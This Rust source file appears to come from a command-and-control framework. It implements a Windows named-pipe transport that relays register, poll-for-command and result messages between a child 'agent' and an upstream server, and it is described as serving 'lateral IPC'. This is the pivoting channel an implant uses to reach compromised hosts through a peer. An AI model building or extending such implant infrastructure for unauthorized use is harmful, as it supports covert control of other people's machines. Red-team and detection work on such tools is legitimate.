//! Named-pipe transport for parent↔child IPC on Windows.

#![cfg(target_os = "windows")]

use anyhow::{bail, Result};
use cloakcat_protocol::{Command, FileChunk, RegisterReq, RegisterResp, ResultReq};

use crate::protocol::envelope::Envelope;

use super::Transport;
use crate::io::win_pipe::{
    self, PipeHandle,
};
use crate::utils::rand_hex;

/// SMB-style named-pipe transport for local or lateral IPC.
pub struct PipeTransport {
    pipe_name: String,
    is_server: bool,
    handle: Option<PipeHandle>,
}

impl PipeTransport {
    /// Create a new pipe transport.
    ///
    /// If `pipe_name` is `None`, a random name is generated
    /// (e.g. `\\.\pipe\ipc_a1b2c3d4e5f6g7h8`).
    pub fn new(pipe_name: Option<String>, is_server: bool) -> Self {
        let pipe_name = pipe_name
            .unwrap_or_else(|| format!("\\\\.\\pipe\\ipc_{}", rand_hex(8)));
        Self {
            pipe_name,
            is_server,
            handle: None,
        }
    }

    /// Initialise the underlying pipe connection.
    ///
    /// - **Server mode**: creates the named pipe, then blocks until a client connects.
    /// - **Client mode**: connects to an existing pipe with up to 3 retries (5 s timeout each).
    pub fn init(&mut self) -> Result<()> {
        let raw = if self.is_server {
            let h = win_pipe::create_pipe_server(&self.pipe_name)?;
            win_pipe::accept_connection(h)?;
            h
        } else {
            win_pipe::connect_pipe_client_retry(&self.pipe_name, 3, 5000)?
        };
        self.handle = Some(PipeHandle::from_raw(raw));
        Ok(())
    }

    /// Return the pipe name (e.g. `\\.\pipe\ipc_deadbeef`).
    pub fn pipe_name(&self) -> &str {
        &self.pipe_name
    }

    /// Relay loop: receive envelopes from the child agent and forward
    /// each request to `upstream`, then send the response back over the pipe.
    ///
    /// Runs until the pipe is broken (child disconnected).
    pub async fn serve_loop<T: Transport>(
        &self,
        upstream: &T,
        url: &str,
        token: &str,
    ) -> Result<()> {
        let pipe = self
            .handle
            .as_ref()
            .expect("init() must be called before serve_loop()");

        loop {
            let raw = match pipe.recv() {
                Ok(b) => b,
                Err(_) => break, // broken pipe — child disconnected
            };

            let envelope: Envelope = serde_json::from_slice(&raw)?;

            let reply = match envelope {
                Envelope::V1Register(req) => {
                    let resp = upstream.register(url, token, &req).await?;
                    Envelope::V1RegisterResp(resp)
                }
                Envelope::V1Poll { agent_id, hold } => {
                    let poll_url = format!("{}/poll/{}?hold={}", url, agent_id, hold);
                    let (_status, body) = upstream.poll(&poll_url, token).await?;
                    let cmd: Option<Command> = serde_json::from_str(&body).unwrap_or(None);
                    Envelope::V1PollResp(cmd)
                }
                Envelope::V1Result(req) => {
                    upstream.send_result(url, token, &req).await?;
                    Envelope::V1Ack
                }
                other => bail!("unexpected envelope in serve_loop: {:?}", other),
            };

            let payload = serde_json::to_vec(&reply)?;
            pipe.send(&payload)?;
        }

        Ok(())
    }
}

impl Transport for PipeTransport {
    async fn register(&self, _url: &str, _token: &str, req: &RegisterReq) -> Result<RegisterResp> {
        let pipe = self.handle.as_ref().expect("init() must be called before register()");

        let envelope = Envelope::V1Register(req.clone());
        let payload = serde_json::to_vec(&envelope)?;
        pipe.send(&payload)?;

        let resp_bytes = pipe.recv()?;
        let resp_envelope: Envelope = serde_json::from_slice(&resp_bytes)?;

        match resp_envelope {
            Envelope::V1RegisterResp(resp) => Ok(resp),
            other => bail!("expected V1RegisterResp, got {:?}", other),
        }
    }

    async fn poll(&self, _url: &str, _token: &str) -> Result<(u16, String)> {
        let pipe = self.handle.as_ref().expect("init() must be called before poll()");

        let envelope = Envelope::V1Poll {
            agent_id: String::new(), // filled by caller context
            hold: 0,
        };
        let payload = serde_json::to_vec(&envelope)?;
        pipe.send(&payload)?;

        let resp_bytes = pipe.recv()?;
        let resp_envelope: Envelope = serde_json::from_slice(&resp_bytes)?;

        match resp_envelope {
            Envelope::V1PollResp(cmd) => {
                let body = serde_json::to_string(&cmd)?;
                let status = if cmd.is_some() { 200 } else { 204 };
                Ok((status, body))
            }
            other => bail!("expected V1PollResp, got {:?}", other),
        }
    }

    async fn send_result(&self, _url: &str, _token: &str, req: &ResultReq) -> Result<()> {
        let pipe = self.handle.as_ref().expect("init() must be called before send_result()");

        let envelope = Envelope::V1Result(req.clone());
        let payload = serde_json::to_vec(&envelope)?;
        pipe.send(&payload)?;

        let resp_bytes = pipe.recv()?;
        let resp_envelope: Envelope = serde_json::from_slice(&resp_bytes)?;

        match resp_envelope {
            Envelope::V1Ack => Ok(()),
            other => bail!("expected V1Ack, got {:?}", other),
        }
    }

    async fn fetch_upload_file(&self, _url: &str, _token: &str) -> Result<Vec<u8>> {
        todo!()
    }

    async fn send_download_chunk(&self, _url: &str, _token: &str, _chunk: &FileChunk) -> Result<()> {
        todo!()
    }
}
